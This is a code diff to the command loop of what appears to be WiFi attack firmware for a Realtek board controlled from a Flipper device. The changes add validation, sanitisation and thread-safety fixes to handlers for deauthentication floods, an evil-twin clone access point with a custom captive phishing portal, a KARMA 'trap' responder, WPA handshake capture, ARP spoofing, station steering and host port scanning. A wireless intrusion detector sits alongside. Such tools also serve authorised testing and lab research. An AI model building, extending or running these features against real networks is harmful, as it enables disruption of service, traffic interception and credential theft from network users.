-      build_portal_urls(apssid);        // DHCP opt-114 / DNS / cp.json host derive from the AP name
       int apch = atoi(ap_channel);      // set by CHANNEL; 0 -> atStart falls back to ch6
-      webui_mode = false;               // AT_HTTP checks webui_mode first; clear any stale WebUI state
-      atStart(apch, apssid, /*portal=*/true);
+      // Publish the URL only once the lifecycle accepted: a refused APSTART must not retarget a
+      // running AP. atStart() sets webui_mode itself.
+      if (atStart(apch, apssid, /*portal=*/true))
+        build_portal_urls(apssid);      // DHCP opt-114 / DNS / cp.json host derive from the AP name
     }else if(readString.substring(0,8)=="RICKROLL"){
       
       rickroll =true;
@@ -2469,43 +2795,36 @@ void loop() {
       ghostSpam = true;
       DEBUG_SER_PRINT("Start GHOSTSPAM\n");
     }else if(readString.substring(0,10)=="PORTALHTML"){
-      // Custom portal: append hex-encoded HTML (chunked from the Flipper SD file).
-      // Parse hex char-by-char (no String temporaries -> no heap churn over many chunks).
+      // Custom portal: append hex-encoded HTML (chunked from the Flipper SD file). Parsing stays
+      // here; the mutation runs in the tcpip thread so it cannot interleave with a resolve.
       int s1 = readString.indexOf(' ');
       String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
-      const char* h = hex.c_str();
-      uint16_t added = 0;
-      for(int i = 0; h[i] && h[i+1] && customPortalLen < sizeof(customPortal) - 1; i += 2){
-        int hi = hexnib(h[i]);
-        int lo = hexnib(h[i+1]);
-        if(hi < 0 || lo < 0) break;
-        customPortal[customPortalLen++] = (char)((hi << 4) | lo);
-        added++;
-      }
-      customPortal[customPortalLen] = 0;
-      String r = "PORTALHTML:+" + String((unsigned)added) + " total=" + String((unsigned)customPortalLen);
+      web_lwip_portal_edit(portal_append_cb, hex.c_str());
+      String r = "PORTALHTML:+" + String((unsigned)portalAdded) + " total=" + String((unsigned)customPortalLen);
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,9)=="PORTALROT"){
       // C2: enable/disable portal rotation. Args: PORTALROT <0|1>
       int s1 = readString.indexOf(' ');
       int v = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 0;
-      portal_rot = (v != 0);
-      String r = String("PORTALROT:") + (portal_rot ? "on" : "off");
+      web_lwip_portal_edit(portal_rot_cb, &v);
+      String r = String("PORTALROT:") + (v != 0 ? "on" : "off");
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,11)=="PORTALCLEAR"){
-      customPortalLen = 0;
-      customPortal[0] = 0;
+      web_lwip_portal_edit(portal_clear_cb, NULL);
       Serial.println("PORTALCLEAR:ok"); Serial1.println("PORTALCLEAR:ok");
     }else if(readString.substring(0,10)=="PORTALHASH"){
       // Diagnostic: length + FNV-1a hash of the loaded custom portal, so we can prove the
       // bytes the board serves are identical to the SD file (catches upload corruption).
-      unsigned long h = 2166136261UL;
-      for(unsigned int i=0; i<customPortalLen; i++){ h ^= (uint8_t)customPortal[i]; h *= 16777619UL; }
+      web_lwip_portal_edit(portal_hash_cb, NULL);   // read in the tcpip thread: no torn read
       char b[80];
-      snprintf(b, sizeof(b), "PORTALHASH:%u:%08lx", (unsigned)customPortalLen, h);
+      snprintf(b, sizeof(b), "PORTALHASH:%u:%08lx", (unsigned)customPortalLen, portalHash);
       Serial.println(b); Serial1.println(b);
     }else if(readString.substring(0,6)=="PORTAL"){
-      portal = readString.substring(7,readString.length()-1).toInt();
+      // Clamp: the resolver has a default, but PORTALROT wraps at 6 and an out-of-range index
+      // silently pinned the Default page forever.
+      int pv = readString.substring(7,readString.length()-1).toInt();
+      if (pv < 0 || pv > 6) pv = 0;
+      web_lwip_portal_edit(portal_select_cb, &pv);
        
     }else if(readString.substring(0,6)=="REASON"){
       deauth_reason = readString.substring(7,readString.length()-1).toInt();
@@ -2557,22 +2876,12 @@ void loop() {
       mac = readString.substring(6,readString.length()-1);
       //wifi_disconnect();
       DEBUG_SER_PRINT("APMAC "+mac+"\n");
-      if(mac.length()==17){
+      char macStr[20];
+      mac.toCharArray(macStr, sizeof(macStr));
+      uint8_t parsed[6];
+      if(mac.length() == 17 && parse_mac_colon(macStr, parsed)){
+        memcpy(customMac, parsed, 6);
         useCustomMac=true;
-        
-        char macStr[18]; 
-        mac.toCharArray(macStr, sizeof(macStr)); 
-
-        char *token = strtok(macStr, ":");
-        int i = 0;
-
-        while (token != NULL && i < 6) {
-            customMac[i] = strtoul(token, NULL, 16);
-            token = strtok(NULL, ":");
-            i++;
-        }
-        
-
 
         Serial.print("MAC en bytes: ");
         for (int i = 0; i < 6; i++) {
@@ -2605,14 +2914,14 @@ void loop() {
       String b = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
       String c = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
       int ch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
-      if(b.length() != 12 || ch < 1 || ch > 165){
+      uint8_t bssid[6], client[6];
+      bool have = false;
+      if(!hex_to_mac(b, bssid) || !is_valid_tx_channel(ch) || (c.length() && !hex_to_mac(c, client))){
         Serial.println("ERR:DEAUTHADD:badargs"); Serial1.println("ERR:DEAUTHADD:badargs");
       }else if(dauth_n >= DAUTH_MAX){
         Serial.println("ERR:DEAUTHADD:full"); Serial1.println("ERR:DEAUTHADD:full");
       }else{
-        uint8_t bssid[6]; hex_to_mac(b, bssid);
-        uint8_t client[6]; bool have = false;
-        if(c.length() == 12){ hex_to_mac(c, client); have = true; }
+        have = (c.length() == 12);
         dauth_add(bssid, have ? client : NULL, have, (uint8_t)ch);
         String r = "DEAUTHADD:OK n=" + String((unsigned)dauth_n);
         Serial.println(r); Serial1.println(r);
@@ -2644,17 +2953,15 @@ void loop() {
         String ess  = (a > 0) ? rest.substring(a + 1, b > 0 ? b : rest.length()) : String("");
         int ch = (b > 0) ? rest.substring(b + 1, c > 0 ? c : rest.length()).toInt() : 6;
         bool live = (sub.indexOf("LIVE") >= 0);
-        uint8_t bs[6]; bool okb = (bhex.length() == 12);
-        for(int i = 0; okb && i < 6; i++)
-          bs[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
+        uint8_t bs[6]; bool okb = hex_to_mac(bhex, bs);
         if(!okb || ess.length() == 0 || ch < 1 || ch > 165){
           Serial1.println("EVILTWIN:usage START <bssid-12hex> <ssid> <ch> [LIVE]");
-        }else if(live && !((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165))){
+        }else if(live && !is_valid_tx_channel(ch)){
           // LIVE brings up a clone AP, and an AP cannot sit on a DFS channel: refuse now instead of
           // spending the 4 s deauth burst and then failing in atStartClone.
           Serial1.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
-        }else if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
-                 dauth_run || hv_phase != HV_IDLE || wids_on || sniff_stream || et_phase != ET_IDLE){
+        }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+                 dauth_run || hv_phase != HV_IDLE || wids_on || SNIFF_ON() || et_phase != ET_IDLE){
           Serial1.println("EVILTWIN:busy");
         }else{
           memcpy(et_bssid, bs, 6);
@@ -2664,10 +2971,11 @@ void loop() {
           // LIVE evil-twin brings up a clone AP + captive portal -> serve it via the raw-lwIP
           // portal listener (the Arduino WiFiServer never receives AP connections).
           web_portal_mode = live;
-          char m[104];
+          char m[104], safe[33];
+          sanitize_text(et_ssid, safe, sizeof(safe));
           snprintf(m, sizeof(m),
                    "EVILTWIN:started ssid=\"%s\" ch=%d target=%02X%02X%02X%02X%02X%02X %s",
-                   et_ssid, et_ch, et_bssid[0], et_bssid[1], et_bssid[2],
+                   safe, et_ch, et_bssid[0], et_bssid[1], et_bssid[2],
                    et_bssid[3], et_bssid[4], et_bssid[5], et_live ? "LIVE" : "DRY");
           Serial.println(m); Serial1.println(m);
           if(!et_live){   // dry: announce the first "would deauth" immediately
@@ -2691,23 +2999,32 @@ void loop() {
       // and deauth the real AP so its clients reconnect to us. The AP comes up through the
       // cooperative lifecycle (atStart), so loop() stays responsive; the old synchronous createAP()
       // is gone. The deauth list keeps running on the AP's own channel.
-      int numStation = readString.substring(5, readString.length()-1).toInt();
-      if(numStation < 0 || numStation >= (int)scan_results.size()){
+      int numStation;
+      if(!arg_index(readString, 5, &numStation)) { atReply("ERROR:EVIL:badindex"); continue; }
+      if(numStation >= (int)scan_results.size()){
         atReply("ERROR:EVIL:badindex");
       }else if(scan_results[numStation].ssid.length() == 0){
         atReply("ERROR:EVIL:badssid (rescan)");
       }else{
         char chbuf[4];
         itoa(scan_results[numStation].channel, chbuf, 10);
+        // atStart() may still refuse (busy); only then publish the new portal host and the target,
+        // otherwise a refused EVIL would leave the running AP advertising the wrong URL.
         if(createAP((char*)scan_results[numStation].ssid.c_str(), chbuf)){
+          build_portal_urls(scan_results[numStation].ssid.c_str());
           deauth_wifis.push_back(numStation);
           atReply("EVIL:started");
         }
       }
     }else if(readString.substring(0,6)=="DEAUTH"){
       // DEAUTH <n>: add scan result n to the multi-target deauth list (TX only, no AP).
-      int numStation = readString.substring(7,readString.length()-1).toInt();
-      if(numStation < (int)scan_results.size()&&numStation >=0){
+      int numStation;
+      if(!arg_index(readString, 7, &numStation)) { atReply("ERROR:DEAUTH:badindex"); continue; }
+      if(numStation < (int)scan_results.size()){
+        bool dup = false;
+        for(unsigned int i = 0; i < deauth_wifis.size(); i++)
+          if(deauth_wifis[i] == numStation) { dup = true; break; }
+        if(dup) { atReply("DEAUTH:already"); continue; }
         DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
         deauth_wifis.push_back(numStation);
         DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
@@ -2721,14 +3038,22 @@ void loop() {
       Serial1.print("PONG\n");
       
     }else if(readString.substring(0,5)=="LISTB"){
+      // A timed-out scan is still appending to the vector; reading it now races reallocation.
+      if (scan_running) {
+        uint32_t w0 = millis();
+        while (!SCANDONE_LOAD() && (millis() - w0) < 1500u) delay(10);
+        if (SCANDONE_LOAD()) scan_running = false;
+        else { atReply("ERROR:LIST:scan still running"); continue; }
+      }
       // M0.3: binary scan list. One DP_SCAN_AP frame per AP, self-delimiting via `total` (the FAP
       // stores into a fixed array -> no heap growth, which is what actually fixes B2). Emitted on
       // BOTH UARTs: Serial1 for the FAP, Serial for host verification over CH340. Additive — the
       // ASCII LIST below is untouched. Checked before LIST so "LIST" (substring 0,4) can't shadow it.
-      // payload: idx(u8) total(u8) bssid[6] ch(u8) sec(u8) rssi(i16 LE) ssid_len(u8) ssid[ssid_len]
+      // payload: idx(u8) total(u8) bssid[6] ch(u8) sec(u32 LE) rssi(i16 LE) ssid_len(u8) ssid[..]
+      // sec is the full Realtek bitmask (WPA2 is 0x00200000), so one byte truncated it to 0.
       {
         uint8_t total = (uint8_t)(scan_results.size() > 255 ? 255 : scan_results.size());
-        uint8_t pay[2 + 6 + 1 + 1 + 2 + 1 + 32];
+        uint8_t pay[2 + 6 + 1 + 4 + 2 + 1 + 32];
         uint8_t out[PETREL_FRAME_MAX];
         if (total == 0) {                       // still signal "done, 0 results"
           uint8_t p0[2] = {0, 0};
@@ -2743,7 +3068,10 @@ void loop() {
           pay[k++] = total;
           memcpy(pay + k, r.bssid, 6); k += 6;
           pay[k++] = r.channel;
-          pay[k++] = (uint8_t)r.security;
+          pay[k++] = (uint8_t)(r.security & 0xFF);
+          pay[k++] = (uint8_t)((r.security >> 8) & 0xFF);
+          pay[k++] = (uint8_t)((r.security >> 16) & 0xFF);
+          pay[k++] = (uint8_t)((r.security >> 24) & 0xFF);
           pay[k++] = (uint8_t)(r.rssi & 0xFF);
           pay[k++] = (uint8_t)((r.rssi >> 8) & 0xFF);
           pay[k++] = sl;
@@ -2754,16 +3082,24 @@ void loop() {
         }
       }
     }else if(readString.substring(0,4)=="LIST"){
+      if (scan_running) {
+        uint32_t w0 = millis();
+        while (!SCANDONE_LOAD() && (millis() - w0) < 1500u) delay(10);
+        if (SCANDONE_LOAD()) scan_running = false;
+        else { atReply("ERROR:LIST:scan still running"); continue; }
+      }
 
       for (uint i = 0; i < scan_results.size(); i++) {
         // The line is '|'-delimited, so a '|' inside the SSID would shift every later field. Print
         // it as '?' - the same substitution the FAP's binary decoder makes, so both paths agree.
         String safe = scan_results[i].ssid;
         safe.replace("|", "?");
+        char safe2[33]; sanitize_text(safe.c_str(), safe2, sizeof(safe2));
+        String safe3 = String(safe2) + "|";
         Serial.print("AP:"+String(i)+"|");
-        Serial.print(safe + "|");
+        Serial.print(safe3);
         Serial1.print("AP:"+String(i)+"|");
-        Serial1.print(safe + "|");
+        Serial1.print(safe3);
         {
           // %02X: bytes <0x10 must keep their leading zero, else the host's colon-stripped
           // 12-hex BSSID (used by HSGRAB/PKGRAB/DEAUTHADD) comes up short and is rejected,
@@ -2822,21 +3158,24 @@ void loop() {
       if(secs < 1 || secs > 60) secs = 10;
       if(apActive) destroyAP();   // tear the softAP down first: its HTTP accept loop starves
                                   // the monitor capture (CAPTURE/HSGRAB otherwise never finish)
-      hs_count = 0;
+      // A repeated CAPTURE must not reset the buffers under a live callback: quiesce first.
+      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+      HSCAP_SET(false);
+      HSCOUNT_SET(0);
       cap_ch = ch;
       hsg_target_set = false;   // passive CAPTURE is channel-wide: keep every AP's EAPOL
-      hs_cap = true;
+      HSCAP_SET(true);
       wext_set_channel(WLAN0_NAME, ch);
       wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
       cap_deadline = millis() + (uint32_t)secs * 1000u;
-      cap_active = true;   // loop() finishes it after `secs`; CAPSTOP aborts early
+      CAP_SET(true);       // loop() finishes it after `secs`; CAPSTOP aborts early
       Serial.println("CAPTURE: armed"); Serial1.println("CAPTURE: armed");
     }else if(readString.substring(0,7)=="CAPSTOP"){
       // B: abort an in-flight capture and stream what we have.
-      if(cap_active){
+      if(CAP_ON()){
         wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
-        hs_cap = false;
-        cap_active = false;
+        HSCAP_SET(false);
+        CAP_SET(false);
         hs_stream(cap_ch);
       }else{
         Serial.println("CAPSTOP: idle"); Serial1.println("CAPSTOP: idle");
@@ -2848,23 +3187,24 @@ void loop() {
       // everything but STOP/PING while it owns the radio). All replies go on Serial1 (control).
       String sub = readString.substring(5); sub.trim();
       if(sub.startsWith("START")){
-        if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned()){
+        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned()){
           Serial1.println("SNIFF:busy");
         }else{
           int sp = sub.indexOf(' ');
           int ch = (sp > 0) ? sub.substring(sp+1).toInt() : 6;
           if(ch < 1 || ch > 165) ch = 6;
-          frm_head = frm_tail = 0; frm_drop = 0;
-          sniff_stream = true;    // arm before promisc so the first frame is captured
+          FRM_STORE(&frm_head, 0); FRM_STORE(&frm_tail, 0); __atomic_store_n(&frm_drop, 0u, __ATOMIC_RELAXED);
+          SNIFF_SET(true);        // arm before promisc so the first frame is captured
           wext_set_channel(WLAN0_NAME, ch);
           wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
           Serial1.print("SNIFF:armed ch="); Serial1.println(ch);
         }
       }else if(sub.startsWith("STOP")){
-        if(sniff_stream){
+        if(SNIFF_ON()){
           wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
-          sniff_stream = false;
-          Serial1.print("SNIFF:stopped drop="); Serial1.println((unsigned)frm_drop);
+          SNIFF_SET(false);
+          Serial1.print("SNIFF:stopped drop=");
+          Serial1.println((unsigned)FRM_LOAD(&frm_drop));
         }else{
           Serial1.println("SNIFF:idle");
         }
@@ -2901,7 +3241,7 @@ void loop() {
       // run in an RF-isolated lab. Single radio => refuses to start if any other feature owns it.
       String sub = readString.substring(7); sub.trim();
       if(sub.startsWith("START")){
-        if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
            dauth_run || hv_phase != HV_IDLE){
           Serial1.println("HARVEST:busy");
         }else{
@@ -2931,16 +3271,19 @@ void loop() {
       // Detects deauth-flood (rate) and evil-twin (RSN downgrade on a known BSSID). Parks on <ch>.
       String sub = readString.substring(4); sub.trim();
       if(sub.startsWith("START")){
-        if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
-           dauth_run || hv_phase != HV_IDLE || sniff_stream){
+        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+           dauth_run || hv_phase != HV_IDLE || SNIFF_ON()){
           Serial1.println("WIDS:busy");
         }else{
           int sp = sub.indexOf(' ');
           int ch = (sp > 0) ? sub.substring(sp+1).toInt() : 6;
           if(ch < 1 || ch > 165) ch = 6;
+          // A repeated START while the callback is live would reset the ring under the producer:
+          // quiesce first (promisc off), then reset, then re-arm.
+          wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
           wids_ch = ch;
           wids_init(&g_wids);
-          wids_qh = wids_qt = 0;
+          FRM_STORE(&wids_qh, 0); FRM_STORE(&wids_qt, 0);
           wids_on = true;
           wext_set_channel(WLAN0_NAME, ch);
           wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_wids_cb, 0);
@@ -2951,14 +3294,16 @@ void loop() {
         if(wids_on){
           wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
           wids_on = false;
-          char m[56]; snprintf(m, sizeof(m), "WIDS:stopped frames=%lu", (unsigned long)g_wids.seen_frames);
+          char m[56]; snprintf(m, sizeof(m), "WIDS:stopped frames=%lu",
+                               (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED));
           Serial.println(m); Serial1.println(m);
         }else{
           Serial1.println("WIDS:idle");
         }
       }else if(sub.startsWith("STATUS")){
         char m[64]; snprintf(m, sizeof(m), "WIDS:on=%d ch=%d frames=%lu",
-                             (int)wids_on, wids_ch, (unsigned long)g_wids.seen_frames);
+                             (int)wids_on, wids_ch,
+                             (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED));
         Serial.println(m); Serial1.println(m);
       }else{
         Serial1.println("WIDS:usage START [ch]|STOP|STATUS");
@@ -2969,8 +3314,8 @@ void loop() {
       // webui_mode is set.
       String sub = readString.substring(5); sub.trim();
       if(sub.startsWith("START")){
-        if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
-           dauth_run || hv_phase != HV_IDLE || wids_on || sniff_stream || et_phase != ET_IDLE){
+        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+           dauth_run || hv_phase != HV_IDLE || wids_on || SNIFF_ON() || et_phase != ET_IDLE){
           Serial1.println("WEBUI:busy");
         }else{
           webui_mode = true;
@@ -3027,9 +3372,7 @@ void loop() {
       int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 1 || secs > 60) secs = 10;
-      uint8_t bssid[6]; bool ok_bssid = (bssid_hex.length() == 12);
-      for(int i=0; ok_bssid && i < 6; i++)
-        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      uint8_t bssid[6]; bool ok_bssid = hex_to_mac(bssid_hex, bssid);
       if(!ok_bssid){
         Serial.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
         Serial1.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
@@ -3043,13 +3386,13 @@ void loop() {
       // P8: BLE scan. Args: BLESCAN [secs]  (default 5s, max 30s).
       int secs = readString.substring(8, readString.length()-1).toInt();
       if(secs < 1 || secs > 30) secs = 5;
-      ble_n = 0;
       BLE.init();
       BLE.configScan()->setScanMode(GAP_SCAN_MODE_ACTIVE);
       BLE.configScan()->setScanInterval(500);
       BLE.configScan()->setScanWindow(250);
       BLE.configScan()->updateScanParams();
       BLE.setScanCallback(ble_scan_cb);
+      BLEN_SET(0);   // reset after the callback is installed, before the scan can fire
       BLE.beginCentral(0);
       BLE.configScan()->startScan((uint32_t)secs * 1000u);
       ble_stream();
@@ -3347,10 +3690,12 @@ void loop() {
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,8)=="TRAPSTAT"){
       // C1: read-only status (a bare "TRAP" means "trap on", so a query needs its own name).
+      int portalNow = 0;
+      web_lwip_in_tcpip(portal_read_cb, &portalNow);   // `portal` is rotated in the tcpip thread
       String r = String("TRAPSTAT:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                  " ap=" + String(apActive ? trap_ssid : "-") +
-                 " portal=" + String(portal) +
-                 " seen=" + String((unsigned)karma_seen_n);
+                 " portal=" + String(portalNow) +
+                 " seen=" + String((unsigned)KSEEN_LOAD());
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,4)=="TRAP" && readString.charAt(4)==' '){
       // C1: KARMA -> Trap. Args: TRAP <0|1> [chan]. Like KARMA but the first requested SSID is
@@ -3365,17 +3710,17 @@ void loop() {
       trap_on = (on != 0);
       trap_armed = true;
       trap_ssid[0] = 0;
-      karma_pending = false;
+      // Quiesce the producer BEFORE draining: a callback already past its entry check can still
+      // publish, so draining first would let a stale request survive into the new mode.
+      KON_STORE(false);
+      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+      while (karma_take()) {}
       if(trap_on) {
-        karma_on = true;
         if(apActive) destroyAP();
         wext_set_channel(WLAN0_NAME, karma_chan);
+        KON_STORE(true);
         wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
-      } else {
-        karma_on = false;
-        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
-        if(apActive) { destroyAP(); apActive = false; }
-      }
+      } else if(apActive) { destroyAP(); apActive = false; }
       String r = String("TRAPCTL:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                  " ap=" + String(apActive ? trap_ssid : "-");
       Serial.println(r); Serial1.println(r);
@@ -3383,8 +3728,9 @@ void loop() {
       // B1: report the SSIDs the responder has seen, so the host can show them live.
       // NOTE: this must be tested BEFORE the "KARMA" handler below - "KARMALIST" starts with
       // "KARMA", so otherwise it gets swallowed and re-enables the responder on every poll.
-      String r = "KARMALIST:" + String((unsigned)karma_seen_n);
-      for(int i = 0; i < karma_seen_n; i++) r += String("|") + karma_seen[i];
+      int kn = KSEEN_LOAD();
+      String r = "KARMALIST:" + String((unsigned)kn);
+      for(int i = 0; i < kn; i++) r += String("|") + karma_seen[i];
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,5)=="KARMA"){
       // B1: KARMA responder. Args: KARMA <0|1> [chan]
@@ -3393,17 +3739,17 @@ void loop() {
       int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
       int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
       if(ch >= 1 && ch <= 165) karma_chan = ch;
-      karma_on = (on != 0);
-      karma_pending = false;
-      if(karma_on) {
+      KON_STORE(false);
+      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);   // quiesce before draining
+      while (karma_take()) {}
+      if(on != 0) {
         if(apActive) destroyAP();
         wext_set_channel(WLAN0_NAME, karma_chan);
+        KON_STORE(true);
         wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_karma_cb, 0);
-      } else {
-        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
       }
-      String r = String("KARMA:") + (karma_on ? "on" : "off") + " ch=" + String(karma_chan) +
-                 " seen=" + String((unsigned)karma_seen_n);
+      String r = String("KARMA:") + (KON_LOAD() ? "on" : "off") + " ch=" + String(karma_chan) +
+                 " seen=" + String((unsigned)KSEEN_LOAD());
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,9)=="BEACONOFF"){
       // Stop every beacon/SSID-flood mode. Nothing else in the firmware turned all of them off
@@ -3460,7 +3806,7 @@ void loop() {
       int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
       int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 36;
       int cnt = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
-      if(ch < 36 || ch > 165) ch = 36;
+      if(!is_valid_tx_channel(ch)) ch = 36;
       if(cnt < 1 || cnt > 200) cnt = 1;
       if(apActive) destroyAP();
       uint8_t src[6] = {0x00,0xE0,0x4C,0x11,0x22,0x33};
@@ -3524,7 +3870,7 @@ void loop() {
       if(secs < 1 || secs > 30) secs = 10;
       if(ssid.length() == 0){
         Serial.println("ERROR: CHANINTERF needs <ssid> [secs]"); Serial1.println("ERROR: CHANINTERF needs <ssid> [secs]");
-      }else if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
                hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
         Serial.println("CHANINTERF:busy"); Serial1.println("CHANINTERF:busy");
       }else{
@@ -3554,11 +3900,10 @@ void loop() {
       int ch = (s2 > 0) ? readString.substring(s2 + 1, s3 > 0 ? s3 : readString.length() - 1).toInt() : 6;
       int secs = (s3 > 0) ? readString.substring(s3 + 1, readString.length() - 1).toInt() : 10;
       if(secs < 1 || secs > 30) secs = 10;  if(ch < 1 || ch > 165) ch = 6;
-      uint8_t bssid[6]; bool ok = (hex.length() == 12);
-      for(int i = 0; ok && i < 6; i++) bssid[i] = (uint8_t)strtoul(hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      uint8_t bssid[6]; bool ok = hex_to_mac(hex, bssid);
       if(!ok){
         Serial.println("ERROR: BBH needs <bssid-12hex> <chan> [secs]"); Serial1.println("ERROR: BBH needs <bssid-12hex> <chan> [secs]");
-      }else if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
                hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
         Serial.println("BBH:busy"); Serial1.println("BBH:busy");
       }else if(is_dfs_channel(ch)){
@@ -3590,7 +3935,7 @@ void loop() {
       String pcsv = (s4 > 0) ? readString.substring(s4 + 1, readString.length() - 1) : String("22,80,443,445,8080");
       if(ssid.length() == 0 || pass.length() == 0 || ips.length() == 0){
         Serial.println("ERROR: HOSTSCAN <ssid> <pass> <ip> [ports]"); Serial1.println("ERROR: HOSTSCAN <ssid> <pass> <ip> [ports]");
-      }else if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
+      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
                hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
         Serial.println("HOSTSCAN:busy"); Serial1.println("HOSTSCAN:busy");
       }else{
@@ -3642,7 +3987,7 @@ void loop() {
       if(ssid.length()==0||pass.length()==0||vip.length()==0||gip.length()==0){
         Serial.println("ERROR: ARPSPOOF <ssid> <pass> <victim-ip> <gateway-ip> [secs]");
         Serial1.println("ERROR: ARPSPOOF <ssid> <pass> <victim-ip> <gateway-ip> [secs]");
-      }else if(apActive||cap_active||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
+      }else if(apActive||CAP_ON()||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
         Serial.println("ARPSPOOF:busy"); Serial1.println("ARPSPOOF:busy");
       }else{
         uint8_t vi[4]={0,0,0,0}, gi[4]={0,0,0,0};
@@ -3677,7 +4022,7 @@ void loop() {
       if(ssid.length()==0||pass.length()==0){
         Serial.println("ERROR: RESPONDER <ssid> <pass> [secs]");
         Serial1.println("ERROR: RESPONDER <ssid> <pass> [secs]");
-      }else if(apActive||cap_active||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
+      }else if(apActive||CAP_ON()||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
         Serial.println("RESPONDER:busy"); Serial1.println("RESPONDER:busy");
       }else{
         Serial.println("RESPONDER:joining"); Serial1.println("RESPONDER:joining");
@@ -3717,15 +4062,16 @@ void loop() {
       }
       if(!ok) {
         Serial.println("ERROR: BTMSTAS needs a 12-hex bssid"); Serial1.println("ERROR: BTMSTAS needs a 12-hex bssid");
-      }else if(sta_n == 0) {
+      }else if(STA_LOAD() == 0) {
         Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
       }else{
-        if(apch < 1 || apch > 165) apch = 6;
-        if(newch < 1 || newch > 165) newch = 1;
+        if(!is_valid_tx_channel(apch)) apch = 6;
+        if(!is_valid_tx_channel(newch)) newch = 1;
         if(apActive) destroyAP();
         wext_set_channel(WLAN0_NAME, apch);
         uint8_t sent = 0;
-        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
+        uint8_t sn0 = STA_LOAD();
+        for(uint8_t i = 0; i < sn0 && i < STA_MAX; i++) {
